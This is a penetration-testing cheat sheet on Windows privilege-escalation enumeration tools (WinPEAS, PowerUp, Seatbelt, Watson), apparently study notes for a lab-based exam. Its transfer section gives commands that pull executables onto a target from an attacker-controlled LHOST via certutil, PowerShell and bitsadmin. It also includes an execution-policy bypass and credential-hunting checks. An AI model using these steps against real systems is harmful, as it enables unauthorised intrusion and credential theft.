# Windows PrivEsc tools — automated enumeration

## WinPEAS

Most comprehensive Windows enumeration script. Color-coded — red means high-interest finding.

```cmd
# Run executable (precompiled)
winpeas.exe

# Run all checks with color output
winpeas.exe cmd

# Redirect output to file (loses color but useful for review)
winpeas.exe > C:\Temp\winpeas_out.txt
```

Download: https://github.com/carlospolop/PEASS-ng/releases/latest (winpeas.exe and winpeas.bat)

Key output sections to read: Services, Registry, Credentials, Files&Dirs, Processes.

## PowerUp

PowerShell module checking service misconfigs, registry keys, and common PrivEsc paths.

```powershell
# Load module
Import-Module PowerUp.ps1

# Run all checks
Invoke-AllChecks

# Individual checks
Get-ServiceUnquoted                 # unquoted service paths
Get-ModifiableServiceFile           # writable service binaries
Get-RegistryAlwaysInstallElevated   # AlwaysInstallElevated registry
Get-UnattendedInstallFile           # unattended install files with credentials
```

Download: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

If PowerShell execution policy blocks you:
```powershell
powershell -ep bypass -c "Import-Module PowerUp.ps1; Invoke-AllChecks"
```

## Seatbelt

Security posture assessment and enumeration. Broader than PrivEsc — good for credential and config hunting.

```cmd
Seatbelt.exe -group=all
Seatbelt.exe -group=system
Seatbelt.exe CredEnum               # credential providers
Seatbelt.exe WindowsCredentialFiles # credential files
```

Download: https://github.com/GhostPack/Seatbelt (requires compile — use precompiled release)

## Watson

Checks installed patches against known unpatched privilege escalation CVEs.

```cmd
Watson.exe
```

Download: https://github.com/rasta-mouse/Watson (requires compile for target .NET version)

## Transferring tools to Windows targets

```bash
# Attacker — Python HTTP server
python3 -m http.server 8080
```

```cmd
# Target — certutil (almost always available)
certutil -urlcache -f http://LHOST:8080/winpeas.exe C:\Temp\winpeas.exe

# Target — PowerShell Invoke-WebRequest
iwr http://LHOST:8080/winpeas.exe -OutFile C:\Temp\winpeas.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST:8080/winpeas.exe','C:\Temp\winpeas.exe')"

# Target — Bitsadmin (older systems)
bitsadmin /transfer job http://LHOST:8080/winpeas.exe C:\Temp\winpeas.exe
```

Writable staging directories: `C:\Temp`, `C:\Windows\Temp`, `%APPDATA%`, `C:\Users\<user>\AppData\Local\Temp`

## Workflow

1. Transfer WinPEAS — run it, save output
2. Review red-highlighted sections manually
3. Run PowerUp for service-specific checks
4. Look up each finding on HackTricks before exploiting
5. Confirm technique works in lab before exam

Practice: TryHackMe Windows PrivEsc room — https://tryhackme.com/room/windows10privesc
